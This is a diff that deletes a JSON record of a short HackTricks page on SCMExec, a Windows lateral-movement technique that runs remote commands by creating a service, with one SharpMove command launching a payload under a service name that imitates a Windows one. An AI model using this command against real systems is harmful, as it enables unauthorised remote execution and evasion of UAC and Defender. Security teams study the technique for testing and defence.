@@ -1,7 +1,0 @@
-{
-    "url": "https://book.hacktricks.xyz/src/windows-hardening/lateral-movement/scmexec",
-    "title": "scmexec",
-    "category": "src/windows-hardening/lateral-movement",
-    "source": "HackTricks",
-    "content": "# DCOM Exec\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## SCM\n\n**SCMExec** is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service that runs the command. This method can bypass some security controls, such as User Account Control (UAC) and Windows Defender.\n\n## Tools\n\n- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):\n\nSharpMove.exe action=scm computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" servicename=WindowsDebug amsi=true\n\n{{#include ../../banners/hacktricks-training.md}}"
-}
